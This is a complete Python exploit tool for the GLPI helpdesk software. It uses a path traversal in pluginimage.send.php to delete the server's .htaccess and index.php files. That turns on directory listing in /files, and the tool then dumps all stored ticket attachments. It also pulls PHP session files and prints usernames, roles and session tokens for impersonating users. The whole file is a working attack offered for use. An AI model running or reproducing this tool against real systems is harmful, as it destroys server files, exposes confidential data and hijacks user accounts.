#!/usr/bin/env python3
import requests
import re
import argparse
from urllib.request import Request, urlopen, urlretrieve
from bs4 import BeautifulSoup
import os

with open("asciiart.txt", "r") as f:
    print(f.read())

parser = argparse.ArgumentParser(description='GLPI hack tool')
parser.add_argument('--url', help="URL of the GLPI instance", required=True)
parser.add_argument('--dumpfiles',help="Dump the stored ticket attachments", action="store_true")
parser.add_argument('--check',help="Only check if the taget is vulnerable", action="store_true")
parser.add_argument('--sessions', help="Get valid session tokens for impersonation.", action="store_true")
parser.add_argument('--exploit', help="Attempts to exploit the plulginimage vulnerability to get directory listing on /files.", action="store_true")

args = parser.parse_args()

versions = ['0.20', '0.20.1', '0.21', '0.30', '0.31', '0.40', '0.41', '0.42', '0.50', '0.51', '0.51a', '0.60', '0.65',
            '0.68', '0.68.1', '0.68.2', '0.68.3', '0.70', '0.70.1', '0.70.2', '0.71', '0.71.1', '0.71.2', '0.71.3',
            '0.71.4', '0.71.5', '0.71.6', '0.72', '0.72.1', '0.72.2', '0.72.3', '0.72.4', '0.72.21', '0.78', '0.78.1',
            '0.78.2', '0.78.3', '0.78.4', '0.78.5', '0.80', '0.80.1', '0.80.2', '0.80.3', '0.80.4', '0.80.5', '0.80.6',
            '0.80.7', '0.80.61', '0.83', '0.83.1', '0.83.2', '0.83.3', '0.83.4', '0.83.5', '0.83.6', '0.83.7', '0.83.8',
            '0.83.9', '0.83.31', '0.83.91', '0.84', '0.84.1', '0.84.2', '0.84.3', '0.84.4', '0.84.5', '0.84.6',
            '0.84.7', '0.84.8', '0.85', '0.85.1', '0.85.2', '0.85.3', '0.85.4', '0.85.5', '0.90', '0.90.1', '0.90.2',
            '0.90.3', '0.90.4', '0.90.5', '9.1', '9.1.1', '9.1.2', '9.1.3', '9.1.4', '9.1.5', '9.1.6', '9.1.7',
            '9.1.7.1', '9.2', '9.2.1', '9.2.2', '9.2.3', '9.2.4', '9.3', '9.3.0', '9.3.1', '9.3.2', '9.3.3', '9.3.4',
            '9.4.0', '9.4.1', '9.4.1.1', '9.4.2', '9.4.3', '9.4.4', '9.4.5', '9.4.6', '9.5.0', '9.5.1']


def checkVulnerable():
    res = requests.get(args.url, verify=False)
    detectedVersion = ""
    vulnerable = False
    for version in versions:
        search = bool(re.search(version, res.text))
        if search == True:
            detectedVersion = version
            vulnerable = True
    if vulnerable:
        print("Detected GLPI version " + detectedVersion + ", which is most likely vulnerable.")
    else:
        print("The target does not appear to be vulnerable.")
    return vulnerable

def checkFiles():
    res = requests.get(args.url + "/files", verify=False)
    search = bool(re.search("Index of", res.text))
    return search

def dumpFiles():
    if not checkFiles():
        print("Directory listing is not enabled on /files. use --exploit to exploit the pulginimage vulnerability.")
    else:
        recursive_download(args.url + "/files/", False)

def dumpSessions():
    if not checkFiles():
        print("Directory listing is not enabled on /files. use --exploit to exploit the pulginimage vulnerability.")
    else:
        files = recursive_download(args.url + "/files/_sessions/", True)

files = []

def recursive_download(url, session):
    url = url.replace(" ","%20")
    req = Request(url)
    a = urlopen(req).read()
    soup = BeautifulSoup(a, 'html.parser')
    x = (soup.find_all('a'))
    for i in x:
        file_name = i.extract().get_text()
        url_new = url + file_name
        url_new = url_new.replace(" ","%20")
        if(file_name[-1]=='/' and file_name != 'Name' and file_name != 'Last Modified' and file_name != "Size" and file_name != "Description" and file_name != "Parent Directory"):
            recursive_download(url_new, session)
        if (file_name[-1] != '/' and file_name != 'Name' and file_name != 'Last modified' and file_name != "Size" and file_name != "Description" and file_name != "Parent Directory"):
            res = requests.get(url_new, verify=False)
            filename = url_new.split('files/')[1:]
            filename = "./dump/" + "".join(filename)
            if ("_" not in url_new.split("files/")[-1].split('/')[-1] and "." in url_new.split('/')[-1] and url_new.split('/')[-1] != "remove.txt"):
                files.append(filename.split('/')[-1])
            os.makedirs(os.path.dirname(filename), exist_ok=True)
            with open(filename, "wb") as f:
                f.write(res.content)
            if session:
                extractSessionsInfo(filename)

def extractSessionsInfo(filename):
    with open(filename) as f:
        session = f.read()
        valid = bool(re.search("glpiname\\|", session))
        if valid:
            username = session.split('glpiname|')[1].split('"')[1]
            role = session.split('glpiprofiles|')[1].split('"name"')[1].split('"')[1]
            token = filename.split('/')[-1].split("sess_")[1]
            print('Session found : \n Username : ' + username + '\n Role : ' + role +'\n Token : ' + token)

def exploit():
    if checkVulnerable() and not checkFiles():
        requests.get(args.url + "/front/pluginimage.send.php?plugin=..&name=.htaccess&clean", verify=False)
        requests.get(args.url + "/front/pluginimage.send.php?plugin=..&name=index.php&clean", verify=False)
    if checkFiles(): 
        print("Exploitation successful, directory listing is now enabled on the /files folder.")
        return True
    else: 
        print("Exploitation unsuccessful, unable to get directory listing on the /files folder.")
        return False

def printCount(files):
    print("Dump completed! Found " + str(len(files)) + " files in total. \nDetails: ")
    extensions = []
    count = []
    for file in files:
        extension = file.split('.')[-1].upper()
        if extension not in extensions:
            extensions.append(extension)
            count.append(1)
            continue
        count[extensions.index(extension)] += 1
    for text in extensions:
        print(" Found " + str(count[extensions.index(text)]) + " " + text + " file(s).")
    print('File list:')
    for file in files: 
        print(" " + file)
    

if args.check:
    if checkFiles():
        print("The target already has directory listing on the /files folder. Use --dumpfiles or --session for exploitation.")
        quit()
    checkVulnerable()
    quit()

if args.exploit:
    exploit()

if args.dumpfiles:
    dumpFiles()
    printCount(files)

if args.sessions:
    dumpSessions()

if not args.check and not args.dumpfiles and not args.exploit and not args.sessions:
    print('Please specify something to do. (use -h to get the help menu)')
    quit()
